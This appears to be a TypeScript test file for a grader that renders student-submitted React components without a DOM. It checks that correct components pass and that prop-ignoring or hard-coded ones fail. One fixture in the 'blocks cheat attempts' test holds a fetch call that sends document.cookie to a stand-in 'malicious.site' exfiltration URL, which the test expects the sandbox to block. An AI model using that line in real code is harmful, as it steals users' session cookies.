import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import * as React from 'react';
import {
  render,
  runReactRenderCheck,
  getReactRuntimeSync,
} from '../src/lib/code/react/reactRenderCheck';
import { buildJsTaskScript, REACT_RENDER_HELPER_SCRIPT } from '../src/lib/code/runners/jsTaskScript';

describe('React render checks without a DOM (CHK-3 / W-04)', () => {
  it('bundles react-runtime.js exposing __PINIT_REACT__ with React and renderToStaticMarkup', () => {
    const runtime = getReactRuntimeSync();
    assert.ok(runtime.length > 1000, 'Runtime bundle must not be empty');
    assert.ok(runtime.includes('__PINIT_REACT__'), 'Runtime must expose __PINIT_REACT__');
  });

  it('renders a React component to static markup using render helper', () => {
    const Greeting = ({ name }: { name: string }) => React.createElement('h1', null, `Hello, ${name}!`);
    const html = render(Greeting, { name: 'Ada Lovelace' });
    assert.strictEqual(html, '<h1>Hello, Ada Lovelace!</h1>');
  });

  it('passes when a correct Greeting({ name }) component is tested across 3 different names', async () => {
    const studentTsx = `
      interface GreetingProps {
        name: string;
      }
      export function Greeting({ name }: GreetingProps) {
        return <div className="user-greeting">Welcome, {name}!</div>;
      }
    `;

    const testSuite = `
      const names = ['Alice', 'Bob', 'Charlie'];
      for (const name of names) {
        const html = render(Greeting, { name });
        const expected = '<div class="user-greeting">Welcome, ' + name + '!</div>';
        if (html !== expected) {
          throw new Error('Greeting failed for ' + name + ': got ' + html);
        }
      }
    `;

    const result = await runReactRenderCheck(studentTsx, testSuite);
    assert.strictEqual(result.ok, true, `Expected check to pass, got error: ${result.error}`);
  });

  it('fails when a component ignores the prop (e.g. static fallback)', async () => {
    const studentTsx = `
      export function Greeting({ name }: { name: string }) {
        return <div className="user-greeting">Welcome, Stranger!</div>;
      }
    `;

    const testSuite = `
      const names = ['Alice', 'Bob', 'Charlie'];
      for (const name of names) {
        const html = render(Greeting, { name });
        if (!html.includes(name)) {
          throw new Error('Greeting must display the name: ' + name);
        }
      }
    `;

    const result = await runReactRenderCheck(studentTsx, testSuite);
    assert.strictEqual(result.ok, false);
    assert.ok(result.error?.includes('Greeting must display the name: Alice'));
  });

  it('fails when a constant answer is supplied that only matches the first input', async () => {
    const studentTsx = `
      export function Greeting({ name }: { name: string }) {
        return <div className="user-greeting">Welcome, Alice!</div>;
      }
    `;

    const testSuite = `
      const names = ['Alice', 'Bob', 'Charlie'];
      for (const name of names) {
        const html = render(Greeting, { name });
        const expected = '<div class="user-greeting">Welcome, ' + name + '!</div>';
        if (html !== expected) {
          throw new Error('Failed for ' + name + ': expected ' + expected + ' but got ' + html);
        }
      }
    `;

    const result = await runReactRenderCheck(studentTsx, testSuite);
    assert.strictEqual(result.ok, false);
    assert.ok(result.error?.includes('Failed for Bob'));
  });

  it('blocks cheat attempts attempting forbidden API execution inside components', async () => {
    const maliciousTsx = `
      export function Greeting({ name }: { name: string }) {
        fetch('https://malicious.site/exfiltrate?token=' + document.cookie);
        return <div>Hello</div>;
      }
    `;

    const testSuite = `
      render(Greeting, { name: 'Test' });
    `;

    const result = await runReactRenderCheck(maliciousTsx, testSuite);
    assert.strictEqual(result.ok, false);
    assert.ok(result.error?.includes('Forbidden API'));
  });

  it('buildJsTaskScript places the runtime and render helper in front of student code for tsx tasks', () => {
    const script = buildJsTaskScript('export const App = () => null;', 'assert(true);', {
      language: 'tsx',
      runtimeScript: '// REACT RUNTIME BUNDLE',
    });

    const runtimeIdx = script.indexOf('// REACT RUNTIME BUNDLE');
    const helperIdx = script.indexOf('globalThis.render = render;');
    const codeIdx = script.indexOf('export const App');
    const testIdx = script.indexOf('assert(true);');

    assert.ok(runtimeIdx !== -1, 'Runtime must be present');
    assert.ok(helperIdx !== -1, 'Render helper must be present');
    assert.ok(codeIdx !== -1, 'Student code must be present');
    assert.ok(testIdx !== -1, 'Test suite must be present');

    assert.ok(runtimeIdx < helperIdx, 'Runtime must come before helper');
    assert.ok(helperIdx < codeIdx, 'Helper must come before student code');
    assert.ok(codeIdx < testIdx, 'Student code must come before test suite');
  });
});
